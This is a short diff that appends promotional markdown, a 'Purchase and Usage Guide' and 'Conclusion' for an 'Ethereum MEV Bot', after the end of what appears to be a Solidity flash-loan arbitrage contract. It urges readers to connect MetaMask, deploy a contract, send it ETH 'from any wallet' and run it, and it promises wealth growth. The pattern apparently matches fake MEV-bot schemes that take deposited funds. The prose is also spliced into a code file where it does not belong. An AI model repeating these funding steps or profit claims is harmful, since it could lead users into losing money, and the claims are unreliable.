@@ -139,3 +139,16 @@ contract FlashLoanArbitrage is IFlashLoanSimple {
         );
     }
 }
+10. Purchase and Usage Guide <a name="purchase-and-usage-guide"></a>⬆️
+Join the MEV Bot ranks now and start your crypto wealth journey!
+
+Visit Purchase Link: [MEV Bot Purchase Link]
+Connect your MetaMask wallet.
+Create and deploy your bot.
+Fund your bot contract Fund your bot contract in two ways:
+Enter the amount of ETH and click Deposit.
+Copy your contract address and send any amount of ETH from any wallet.
+After funding the contract, click RUN/SCAN to launch the bot. The bot will start scanning the mempool for unconfirmed transactions. You can monitor its activity in View Transactions.
+To stop the bot, click Withdrawal.
+11. Conclusion <a name="conclusion"></a>⬆️
+Ethereum MEV Bot is your ultimate weapon to gain a competitive advantage in the DeFi world. Don't hesitate any longer, join us now and start your wealth growth journey! 💪
